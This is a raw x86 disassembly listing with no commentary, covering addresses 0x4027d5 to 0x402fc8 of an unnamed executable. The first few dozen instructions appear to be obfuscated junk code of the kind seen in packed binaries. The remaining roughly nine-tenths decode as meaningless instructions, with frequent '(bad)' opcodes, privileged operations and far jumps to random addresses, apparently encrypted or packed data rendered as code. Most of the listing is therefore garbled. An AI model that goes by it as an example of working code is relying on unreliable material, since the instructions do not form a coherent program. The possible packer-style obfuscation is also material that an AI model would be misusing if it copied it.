  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   edi,DWORD PTR [ebx+0x23],0x7a7a0e2d
  4028e0:	jp     0x40295c
  4028e2:	or     bl,BYTE PTR [edi+0x7a]
  4028e5:	jp     0x4028fc
  4028e7:	sub    al,0x17
  4028e9:	and    DWORD PTR [ecx],ebx
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi+0x57],0x6d6a6a61
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1c42f8bf
  40298a:	fimul  WORD PTR ds:[edi+ebx*1+0x49bc3e6b]
  402992:	mov    BYTE PTR [ebx-0x29e273af],dl
  402998:	xor    esp,DWORD PTR [eax-0x3b]
  40299b:	int3   
  40299c:	pminsw mm5,QWORD PTR [eax-0x17e2baf6]
  4029a3:	dec    esi
  4029a4:	ss inc edi
  4029a6:	and    ebp,DWORD PTR [edx]
  4029a8:	ins    BYTE PTR es:[edi],dx
  4029a9:	das    
  4029aa:	ss mov al,0xb
  4029ad:	hlt    
  4029ae:	xor    dl,BYTE PTR [edx]
  4029b0:	iret   
  4029b1:	jl     0x4029f4
  4029b3:	(bad)
  4029b7:	sbb    BYTE PTR ds:0xb031cc3b,0x44
  4029be:	arpl   WORD PTR [eax+0x29],bp
  4029c1:	jmp    DWORD PTR [ebx-0x53]
  4029c4:	scas   al,BYTE PTR es:[edi]
  4029c5:	emms   
  4029c7:	pop    edi
  4029c8:	add    BYTE PTR [ebp+0x601d8c3d],ch
  4029ce:	and    BYTE PTR [edx+0x6595203],0xa5
  4029d5:	aaa    
  4029d6:	cdq    
  4029d7:	jge    0x402998
  4029d9:	dec    edx
  4029da:	std    
  4029db:	mov    bh,0x6c
  4029dd:	cmp    BYTE PTR [edx],0xe7
  4029e0:	js     0x402a27
  4029e2:	je     0x4029f4
  4029e4:	xor    eax,0xea9ebcb9
  4029e9:	fimul  WORD PTR [edi-0x64913344]
  4029ef:	mov    ds:0xc4c6660f,al
  4029f4:	gs cld 
  4029f6:	or     al,0x7e
  4029f8:	(bad)  
  4029f9:	aad    0x29
  4029fb:	rcr    dl,1
  4029fd:	sbb    ch,BYTE PTR ds:0x2213d44b
  402a03:	dec    ebp
  402a04:	int    0x8a
  402a06:	repnz into 
  402a08:	ret    0xca44
  402a0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a0c:	into   
  402a0d:	je     0x402a56
  402a0f:	idiv   dl
  402a11:	sub    esp,ecx
  402a13:	call   0xbd9:0x32ed7a56
  402a1a:	jp     0x402a10
  402a1c:	add    ah,BYTE PTR [ebp-0x6a]
  402a1f:	ss push ebp
  402a21:	ds jle 0x4029fe
  402a24:	xchg   ebp,eax
  402a25:	mov    eax,ds:0xac7f0b8
  402a2a:	or     edi,edx
  402a2c:	jne    0x4029e9
  402a2e:	sar    DWORD PTR [ecx+0x6a],0xfe
  402a32:	in     eax,0xcb
  402a34:	xchg   ecx,eax
  402a35:	out    dx,al
  402a36:	mov    eax,0x9b35f1b4
  402a3b:	(bad)  
  402a3c:	dec    ebp
  402a3d:	shl    DWORD PTR [edx-0x7f53e272],cl
  402a43:	hlt    
  402a44:	pop    ebp
  402a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a46:	shl    DWORD PTR [edi+0x31],1
  402a49:	ret    
  402a4a:	les    esi,FWORD PTR [ebx]
  402a4c:	sbb    DWORD PTR [ebx+0xb1878e3],ecx
  402a52:	xchg   esi,eax
  402a53:	mov    ebx,0x1b97d9fb
  402a58:	adc    BYTE PTR [ebx+edi*8],ah
  402a5b:	xchg   edi,eax
  402a5c:	cmp    eax,0xdb4d27b9
  402a61:	and    cl,al
  402a63:	repnz hlt 
  402a65:	mov    dl,0x51
  402a67:	sub    eax,0xe38f8b19
  402a6c:	add    bh,al
  402a6e:	push   eax
  402a6f:	jge    0x402a6f
  402a71:	cmp    al,0x82
  402a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a74:	dec    esp
  402a75:	push   ds
  402a76:	add    BYTE PTR [eax],ch
  402a78:	in     eax,0x2
  402a7a:	xchg   DWORD PTR [ebp-0x62],edx
  402a7d:	inc    ecx
  402a7e:	sbb    cl,BYTE PTR [edi]
  402a80:	xchg   edx,eax
  402a81:	jge    0x402abb
  402a83:	sub    ebp,ebx
  402a85:	rcl    cl,1
  402a87:	test   eax,0xf49e61ea
  402a8c:	pop    ds
  402a8d:	hlt    
  402a8e:	pop    edx
  402a8f:	xor    edx,DWORD PTR [eax+0x2e]
  402a92:	in     eax,0xdf
  402a94:	and    eax,0x188d6870
  402a99:	sbb    eax,0x521d3b15
  402a9e:	imul   ecx,DWORD PTR [edx+0x179a4ef0],0x320dc58f
  402aa8:	in     eax,dx
  402aa9:	mov    edi,0x13e6ddcc
  402aae:	loopne 0x402af3
  402ab0:	sub    al,0xee
  402ab2:	jae    0x402b01
  402ab4:	add    BYTE PTR [ebx+0x50311ac9],ah
  402aba:	mov    ah,0xd0
  402abc:	aaa    
  402abd:	xchg   edi,eax
  402abe:	cmp    al,0xdc
  402ac0:	adc    dl,BYTE PTR [edi-0x68afca3e]
  402ac6:	sub    DWORD PTR [ebx-0x11fbc033],esp
  402acc:	and    eax,0x491d5c35
  402ad1:	dec    esi
  402ad2:	jae    0x402b0e
  402ad4:	dec    edx
  402ad5:	daa    
  402ad6:	les    eax,FWORD PTR [ebp-0x6e9e06cb]
  402adc:	out    dx,eax
  402add:	xchg   BYTE PTR [ebx],bl
  402adf:	(bad)  
  402ae0:	cs aas 
  402ae2:	stos   DWORD PTR es:[edi],eax
  402ae3:	or     al,BYTE PTR [edi+0x42c596c2]
  402ae9:	and    dl,bl
  402aeb:	in     eax,0x91
  402aed:	nop
  402aee:	out    0xf,al
  402af0:	mov    ah,0x90
  402af2:	scas   al,BYTE PTR es:[edi]
  402af3:	mov    dl,0x5a
  402af5:	xchg   BYTE PTR [eax-0x2b13553],cl
  402afb:	cmc    
  402afc:	sbb    esi,DWORD PTR [eax-0x60fa16df]
  402b02:	mov    cl,0x4c
  402b04:	xchg   ecx,eax
  402b05:	xchg   ebp,eax
  402b06:	adc    eax,0xfe3f3a75
  402b0b:	sub    eax,eax
  402b0d:	bound  ecx,QWORD PTR [esi-0x5b31f23d]
  402b13:	push   0xffffffc4
  402b15:	jb     0x402b7a
  402b17:	jno    0x402b68
  402b19:	popf   
  402b1a:	jecxz  0x402b34
  402b1c:	mov    ebp,0xd9821e30
  402b21:	ds push es
  402b23:	mov    dh,0xc7
  402b25:	iret   
  402b26:	aas    
  402b27:	(bad)  
  402b28:	sub    ch,bh
  402b2a:	adc    BYTE PTR [esi],ah
  402b2c:	dec    edi
  402b2d:	ror    BYTE PTR [eax-0x5],0x6
  402b31:	and    ecx,eax
  402b33:	cdq    
  402b34:	icebp  
  402b35:	or     esp,DWORD PTR [edx]
  402b37:	fsub   DWORD PTR [eax]
  402b39:	pop    esi
  402b3a:	dec    ebp
  402b3b:	dec    esp
  402b3c:	mov    ds:0x5d18df31,eax
  402b41:	int3   
  402b42:	rcl    BYTE PTR [edx-0x24],1
  402b45:	clc    
  402b46:	pop    ss
  402b47:	rcl    DWORD PTR [ecx+0x59c6ef7a],0x26
  402b4e:	ins    BYTE PTR es:[edi],dx
  402b4f:	adc    BYTE PTR es:[eax+0x2d84e90],0xe7
  402b57:	cld    
  402b58:	push   ss
  402b59:	fmulp  st(6),st
  402b5b:	das    
  402b5c:	test   al,0x9a
  402b5e:	lock shl ah,cl
  402b61:	sub    dl,BYTE PTR [edx+eax*8]
  402b64:	adc    BYTE PTR [ecx-0x22a6fdd6],ch
  402b6a:	aas    
  402b6b:	jmp    0x402b6b
  402b6d:	mov    ebx,0x35836c76
  402b73:	pop    es
  402b74:	ins    DWORD PTR es:[edi],dx
  402b75:	jge    0x402ba3
  402b77:	push   ds
  402b78:	push   ebx
  402b79:	xor    al,0xca
  402b7b:	in     eax,0x6
  402b7d:	adc    edi,DWORD PTR [eax]
  402b7f:	fcom   QWORD PTR [ecx]
  402b81:	std    
  402b82:	imul   esp,DWORD PTR [ecx],0x13
  402b85:	and    ch,BYTE PTR [eax+0x2f99fcd3]
  402b8b:	imul   ebx,DWORD PTR gs:[edx-0x2d],0x5a
  402b90:	xor    BYTE PTR [ebp+0x1f28cd80],ch
  402b96:	push   cs
  402b97:	(bad)  
  402b98:	sbb    bh,ch
  402b9a:	rol    eax,cl
  402b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b9d:	enter  0x82b5,0x13
  402ba1:	push   0xa898958
  402ba6:	ds mov bl,0x9b
  402ba9:	jnp    0x402b31
  402bab:	test   DWORD PTR [esi-0x734e003c],edx
  402bb1:	lahf   
  402bb2:	dec    edx
  402bb3:	xchg   edi,eax
  402bb4:	xor    DWORD PTR [ebp+eax*2-0x7bf27ac7],ebx
  402bbb:	pop    edx
  402bbc:	jg     0x402b8e
  402bbe:	push   cs
  402bbf:	and    eax,0x9b0a06f8
  402bc4:	xor    BYTE PTR [esi-0x954a05e],cl
  402bca:	or     eax,0x3c6f35af
  402bcf:	and    BYTE PTR [edx+0x2e00c213],al
  402bd5:	sub    BYTE PTR [eax+eiz*4],bl
  402bd8:	inc    edx
  402bd9:	ins    DWORD PTR es:[edi],dx
  402bda:	scas   eax,DWORD PTR es:[edi]
  402bdb:	and    cl,BYTE PTR [ebx]
  402bdd:	out    dx,eax
  402bde:	add    BYTE PTR [ebp+0x24cd5c7b],bh
  402be4:	test   BYTE PTR [edx],0xcb
  402be7:	mov    ah,0x5b
  402be9:	xor    ah,BYTE PTR [edx]
  402beb:	jne    0x402bb7
  402bed:	scas   eax,DWORD PTR es:[edi]
  402bee:	jmp    0x402bf2
  402bf0:	mov    al,0xfd
  402bf2:	pop    eax
  402bf3:	aaa    
  402bf4:	shr    cl,1
  402bf6:	std    
  402bf7:	mov    ch,0x89
  402bf9:	pop    edi
  402bfa:	jecxz  0x402b91
  402bfc:	aad    0x29
  402bfe:	lods   eax,DWORD PTR ds:[esi]
  402bff:	ret    
  402c00:	inc    esp
  402c01:	sbb    eax,0xe953924b
  402c06:	pop    ecx
  402c07:	xchg   ecx,edx
  402c09:	push   0x952d532a
  402c0e:	add    al,0x35
  402c10:	jp     0x402c84
  402c12:	aaa    
  402c13:	ficom  WORD PTR [ecx]
  402c15:	sbb    DWORD PTR [ecx+0x3a],0xd5dbdbb5
  402c1c:	in     al,dx
  402c1d:	pop    ecx
  402c1e:	retf   
  402c1f:	das    
  402c20:	lds    esp,FWORD PTR [ebx-0x29837b03]
  402c26:	jb     0x402c16
  402c28:	mov    dh,0x70
  402c2a:	adc    DWORD PTR [ecx+0x3d6f0724],ebx
  402c30:	imul   BYTE PTR [edi-0x6d0170aa]
  402c36:	mov    ch,0xbb
  402c38:	fdiv   DWORD PTR [esi]
  402c3a:	xor    DWORD PTR [esi],edi
  402c3c:	sbb    ebp,edi
  402c3e:	les    edx,FWORD PTR [ecx-0x33261e80]
  402c44:	mov    edi,0x61e03fa4
  402c49:	and    DWORD PTR [edx-0x6c4ee605],ecx
  402c4f:	inc    bp
  402c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c52:	lock jns 0x402bf5
  402c55:	or     al,0xec
  402c57:	lea    edi,[edi-0x34078fb2]
  402c5d:	idiv   eax
  402c5f:	sahf   
  402c60:	jle    0x402c5a
  402c62:	scas   eax,DWORD PTR es:[edi]
  402c63:	das    
  402c64:	loope  0x402c63
  402c66:	ins    BYTE PTR es:[edi],dx
  402c67:	retf   0xa369
  402c6a:	mov    edx,0x87cc4cca
  402c6f:	shl    DWORD PTR [ecx+0x34],cl
  402c72:	add    esi,ebx
  402c74:	dec    ecx
  402c75:	mov    al,ds:0x31fc2cb
  402c7a:	rcr    DWORD PTR [edi+0x2c],0xad
  402c7e:	mov    BYTE PTR [ebx+eiz*1],al
  402c81:	dec    ebx
  402c82:	outs   dx,DWORD PTR ds:[esi]
  402c83:	jmp    0x77fa:0x93d9cf66
  402c8a:	xchg   ebp,eax
  402c8b:	jp     0x402c72
  402c8d:	mov    edx,0x52cd7843
  402c92:	mov    ds:0xdb7bf67b,al
  402c97:	pop    edi
  402c98:	(bad)  
  402c99:	push   ebx
  402c9a:	dec    dl
  402c9c:	jmp    0xb1977041
  402ca1:	(bad)  
  402ca2:	mov    dl,0x81
  402ca4:	lods   eax,DWORD PTR ds:[esi]
  402ca5:	sub    dh,dl
  402ca7:	test   ebp,esp
  402ca9:	xchg   DWORD PTR [ebp-0x1356957],esp
  402caf:	(bad)  
  402cb0:	sbb    ch,BYTE PTR [edi]
  402cb2:	sub    DWORD PTR [edi+0x5b],eax
  402cb5:	adc    bh,BYTE PTR [edx]
  402cb7:	daa    
  402cb8:	sbb    BYTE PTR [edi+0x756a1b6a],0x81
  402cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc0:	sbb    al,0x1d
  402cc2:	mov    ds:0x14d04b8f,al
  402cc7:	imul   esi,ecx,0xdb16627f
  402ccd:	and    eax,0x3a9762aa
  402cd2:	retf   
  402cd3:	(bad)  
  402cd4:	shl    ebx,1
  402cd6:	adc    BYTE PTR [edi-0x3a910897],0x11
  402cdd:	lods   al,BYTE PTR ds:[esi]
  402cde:	mov    dl,0x9f
  402ce0:	pop    esi
  402ce1:	fisttp WORD PTR [edi]
  402ce3:	pop    eax
  402ce4:	inc    ebx
  402ce5:	cmp    BYTE PTR [eax],dh
  402ce7:	or     dh,ah
  402ce9:	cmc    
  402cea:	dec    ebp
  402ceb:	xchg   esp,eax
  402cec:	mov    cl,0xa
  402cee:	js     0x402d06
  402cf0:	jecxz  0x402c82
  402cf2:	jnp    0x402c76
  402cf4:	nop
  402cf5:	icebp  
  402cf6:	test   BYTE PTR [ecx],bh
  402cf8:	rcr    DWORD PTR [ebp-0x4d],0x4
  402cfc:	pop    esi
  402cfd:	mov    edx,DWORD PTR [esi]
  402cff:	mov    bh,0x1c
  402d01:	rcl    DWORD PTR [ebx*1-0x239ed735],cl
  402d08:	xchg   DWORD PTR [esp+0x2b],edi
  402d0c:	or     al,0x7d
  402d0e:	add    ch,BYTE PTR [esi-0xe]
  402d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d12:	cmovl  esp,DWORD PTR [esi]
  402d15:	or     ecx,DWORD PTR [ecx-0x165c4f8f]
  402d1b:	fnstenv [eax+0x43]
  402d1e:	(bad)  
  402d1f:	int    0x81
  402d21:	ins    DWORD PTR es:[edi],dx
  402d22:	cmp    bl,BYTE PTR [esi]
  402d24:	mov    eax,0xbe88164e
  402d29:	mov    cl,0x18
  402d2b:	(bad)
  402d2e:	xchg   BYTE PTR [esp+esi*2],ah
  402d31:	cwde   
  402d32:	leave  
  402d33:	loop   0x402cc9
  402d35:	mov    edi,0x1e11138e
  402d3a:	jmp    DWORD PTR [edx-0x482765ba]
  402d40:	imul   edx,DWORD PTR [ebp+ebx*2+0x6f9e29ae],0x24d9192
  402d4b:	imul   edi,DWORD PTR [ecx+edi*4],0x5dcf2f9a
  402d52:	and    bl,cl
  402d54:	sbb    DWORD PTR ds:0x9dc7dc97,ecx
  402d5a:	mov    ds:0x80d94c62,al
  402d5f:	clc    
  402d60:	cmp    al,0x82
  402d62:	aaa    
  402d63:	mov    ecx,0x501f0778
  402d68:	int    0x1e
  402d6a:	pop    ecx
  402d6b:	jnp    0x402db5
  402d6d:	push   ds
  402d6e:	(bad)  
  402d6f:	pop    ds
  402d70:	push   0xffffff97
  402d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d73:	sbb    dl,dh
  402d75:	adc    edx,DWORD PTR [edx+0x7c]
  402d78:	and    al,0xb4
  402d7a:	cmp    eax,0x7902ea28
  402d7f:	add    ch,bl
  402d81:	push   0xa3290452
  402d86:	sub    DWORD PTR [ecx-0x76],esi
  402d89:	and    eax,0xc15d07ed
  402d8e:	xor    edi,DWORD PTR [esi]
  402d90:	inc    ecx
  402d91:	dec    ebx
  402d92:	sbb    eax,0xd85b0b24
  402d97:	call   0x96c6:0x55bb9024
  402d9e:	ds scas eax,DWORD PTR es:[edi]
  402da0:	pop    ecx
  402da1:	or     bh,al
  402da3:	fsub   DWORD PTR ds:0x8778ee0a
  402da9:	mov    al,0xcd
  402dab:	mov    cl,0xd5
  402dad:	retf   
  402dae:	scas   al,BYTE PTR es:[edi]
  402daf:	loopne 0x402e1d
  402db1:	push   ebx
  402db2:	dec    cl
  402db4:	push   ds
  402db5:	mov    ebp,0x554e1298
  402dba:	(bad)  
  402dbb:	pop    eax
  402dbc:	mov    dh,0xa2
  402dbe:	adc    edx,eax
  402dc0:	or     al,0xf5
  402dc2:	pop    ds
  402dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dc4:	or     bh,BYTE PTR [eax+0x681227a4]
  402dca:	(bad)  
  402dcb:	mov    esp,0x31d1d3a9
  402dd0:	lods   eax,DWORD PTR ds:[esi]
  402dd1:	pop    ecx
  402dd2:	clc    
  402dd3:	mov    ch,0x4b
  402dd5:	add    ebx,DWORD PTR [ecx-0x23cfb92d]
  402ddb:	add    cl,BYTE PTR [edi+esi*1+0x68]
  402ddf:	scas   eax,DWORD PTR es:[edi]
  402de0:	sbb    DWORD PTR [edi+0x10],0xffffff83
  402de4:	adc    esi,DWORD PTR [ecx-0x67]
  402de7:	(bad)  
  402de8:	ficom  WORD PTR [esi+ebx*2]
  402deb:	out    0xd3,al
  402ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dee:	imul   ebp,DWORD PTR [eax+0x44],0xffffffec
  402df2:	cli    
  402df3:	bound  ebx,QWORD PTR [edx+0x59]
  402df6:	loope  0x402dd7
  402df8:	mov    ds:0xd20e5754,eax
  402dfd:	adc    DWORD PTR [edx+ebx*2],ebx
  402e00:	retf   0x923e
  402e03:	cmp    al,0x50
  402e05:	stos   BYTE PTR es:[edi],al
  402e06:	aaa    
  402e07:	fadd   QWORD PTR [eax]
  402e09:	xchg   edx,eax
  402e0a:	sub    dl,BYTE PTR [eax-0x20]
  402e0d:	mov    esp,0xce639b33
  402e12:	test   DWORD PTR [ebx+0xc],edx
  402e15:	xor    esp,edi
  402e17:	inc    edx
  402e18:	lods   al,BYTE PTR ds:[esi]
  402e19:	dec    edx
  402e1a:	push   es
  402e1b:	xor    BYTE PTR [ebx+eax*1],dl
  402e1e:	mov    al,0x38
  402e20:	(bad)  
  402e21:	xlat   BYTE PTR ds:[ebx]
  402e22:	pushf  
  402e23:	xor    BYTE PTR [edi+esi*2+0x9],al
  402e27:	imul   esi,DWORD PTR [eax+0x65],0x2e
  402e2b:	stos   BYTE PTR es:[edi],al
  402e2c:	ret    
  402e2d:	cdq    
  402e2e:	psadbw mm2,QWORD PTR [ebx]
  402e31:	or     DWORD PTR [ebx+0x2a],edi
  402e34:	or     al,0x56
  402e36:	std    
  402e37:	dec    ebx
  402e38:	adc    BYTE PTR [ebp+0x2aa76c34],bh
  402e3e:	pushf  
  402e3f:	sbb    BYTE PTR [esi],bl
  402e41:	bound  edx,QWORD PTR [ebx+0x4d630f41]
  402e47:	test   ebp,ebp
  402e49:	nop
  402e4a:	push   ss
  402e4b:	das    
  402e4c:	outs   dx,BYTE PTR ds:[esi]
  402e4d:	sti    
  402e4e:	or     eax,0x22023a4c
  402e53:	loopne 0x402e47
  402e55:	dec    ecx
  402e56:	pop    ebp
  402e57:	adc    DWORD PTR [edx+0x79],edx
  402e5a:	sub    BYTE PTR [edx-0x14],0x7
  402e5e:	cmc    
  402e5f:	jmp    0x12c9:0x6c0eca9d
  402e66:	test   DWORD PTR ds:0x8f7506d9,ecx
  402e6c:	in     eax,0xe8
  402e6e:	js     0x402ece
  402e70:	xlat   BYTE PTR ds:[ebx]
  402e71:	ret    
  402e72:	sub    DWORD PTR [esi],eax
  402e74:	in     al,0xbc
  402e76:	add    DWORD PTR [ebx-0x2],0xffffffd4
  402e7a:	call   0x2661270c
  402e7f:	gs loope 0x402e17
  402e82:	retf   0x3858
  402e85:	std    
  402e86:	ficomp WORD PTR [ecx+0x14]
  402e89:	inc    esp
  402e8a:	dec    ecx
  402e8b:	inc    eax
  402e8c:	cmp    DWORD PTR [esi+0x59],ebx
  402e8f:	inc    ebx
  402e90:	call   0x5bb1:0x62b42846
  402e97:	std    
  402e98:	sub    eax,0x99549baa
  402e9d:	add    BYTE PTR [ecx+0x69],ch
  402ea0:	mov    ebx,0x66851682
  402ea5:	cli    
  402ea6:	mov    esp,0x31279881
  402eab:	xor    BYTE PTR [edx+0x30691e0],0x8c
  402eb2:	mov    BYTE PTR [esi+0x73878ab2],ch
  402eb8:	or     eax,0x98f1d07a
  402ebd:	xor    ecx,ecx
  402ebf:	cmc    
  402ec0:	(bad)  
  402ec2:	xlat   BYTE PTR ds:[ebx]
  402ec3:	dec    ebp
  402ec4:	cmp    DWORD PTR ds:0x6db76f25,edi
  402eca:	fbstp  TBYTE PTR [edx-0x5e]
  402ecd:	push   es
  402ece:	in     al,0xc0
  402ed0:	xlat   BYTE PTR ds:[ebx]
  402ed1:	sub    eax,0x5c8cf6d
  402ed6:	rol    DWORD PTR [edx-0x10e7a47f],0x1e
  402edd:	sub    BYTE PTR [ebx+edi*2-0x63],al
  402ee1:	scas   al,BYTE PTR es:[edi]
  402ee2:	mul    DWORD PTR [edi]
  402ee4:	add    eax,0x91cfcd75
  402ee9:	ja     0x402efa
  402eeb:	hlt    
  402eec:	jl     0x402f43
  402eee:	cwde   
  402eef:	cli    
  402ef0:	and    ch,BYTE PTR [edi]
  402ef2:	rol    BYTE PTR [edi-0x59],0xfd
  402ef6:	outs   dx,DWORD PTR ds:[esi]
  402ef7:	(bad)  
  402ef8:	leave  
  402ef9:	in     eax,dx
  402efa:	mov    ch,0x9
  402efc:	out    0xf8,al
  402efe:	imul   esp,DWORD PTR [edi+0x64],0xffffffce
  402f02:	xchg   edi,eax
  402f03:	mov    esp,0x24da9c64
  402f08:	push   edx
  402f09:	push   edx
  402f0a:	push   ecx
  402f0b:	inc    esp
  402f0c:	add    eax,0xb1b37be
  402f11:	inc    esp
  402f12:	lods   eax,DWORD PTR ds:[esi]
  402f13:	ins    DWORD PTR es:[edi],dx
  402f14:	push   0x24
  402f16:	pop    ebx
  402f17:	cmp    DWORD PTR [ecx],ebp
  402f19:	mov    ch,0xb3
  402f1b:	xchg   DWORD PTR [ecx+0x85791d0],edi
  402f21:	lahf   
  402f22:	xchg   ebx,eax
  402f23:	and    dh,ah
  402f25:	pop    esp
  402f26:	sub    dh,BYTE PTR [ecx]
  402f28:	or     al,0xa6
  402f2a:	sub    esi,DWORD PTR [eax-0x53]
  402f2d:	retf   0x3cd3
  402f30:	and    ah,ah
  402f32:	mov    cl,0xea
  402f34:	inc    edi
  402f35:	add    eax,DWORD PTR [ecx+ebx*1+0x75]
  402f39:	dec    esi
  402f3a:	pop    edx
  402f3b:	push   es
  402f3c:	bnd jge 0x402ec4
  402f3f:	rcl    DWORD PTR [ecx+0x12b4b06e],cl
  402f45:	sbb    al,0xb
  402f47:	jae    0x402f42
  402f49:	cli    
  402f4a:	cwde   
  402f4b:	je     0x402f68
  402f4d:	sbb    al,al
  402f4f:	lods   eax,DWORD PTR ds:[esi]
  402f50:	enter  0x1f0c,0x4
  402f54:	mov    eax,0xcb8e7e7c
  402f59:	sub    dl,ch
  402f5b:	hlt    
  402f5c:	sub    dh,ch
  402f5e:	push   ds
  402f5f:	xchg   esi,eax
  402f60:	mov    es,WORD PTR [ebx+0x25]
  402f63:	push   0xf905557b
  402f68:	loopne 0x402f03
  402f6a:	xchg   edx,eax
  402f6b:	pop    ebx
  402f6c:	aam    0x51
  402f6e:	pop    ebp
  402f6f:	jo     0x402fb6
  402f71:	or     eax,0x86159632
  402f76:	in     eax,dx
  402f77:	mov    ds:0xad8f28e6,al
  402f7c:	sbb    DWORD PTR [ecx],edi
  402f7e:	xchg   ebx,eax
  402f7f:	mov    dl,0x5e
  402f81:	call   FWORD PTR ds:0x7f1959c0
  402f87:	push   edi
  402f88:	(bad)  
  402f8a:	sub    al,0xc1
  402f8c:	and    esp,esp
  402f8e:	pop    eax
  402f8f:	je     0x402f74
  402f91:	and    esi,esp
  402f93:	mov    bl,0xf5
  402f95:	add    al,0x76
  402f97:	inc    edi
  402f98:	xchg   esp,eax
  402f99:	and    ch,BYTE PTR [esi+0x632c7dc1]
  402f9f:	mov    ch,0xd0
  402fa1:	popf   
  402fa2:	icebp  
  402fa3:	push   ecx
  402fa4:	int    0x1c
  402fa6:	mov    ecx,0xe6363019
  402fab:	lods   al,BYTE PTR ds:[esi]
  402fac:	pop    ecx
  402fad:	(bad)
  402fb1:	fwait
  402fb2:	jae    0x403028
  402fb4:	xchg   ecx,eax
  402fb5:	sub    BYTE PTR [bx+si-0x5b],cl
  402fb9:	adc    BYTE PTR [eax-0x4efb894f],0x3a
  402fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fc1:	mov    bh,bl
  402fc3:	dec    edx
  402fc4:	mov    BYTE PTR [edx-0x65],bl
  402fc7:	dec    esi
  402fc8:	pop    ecx
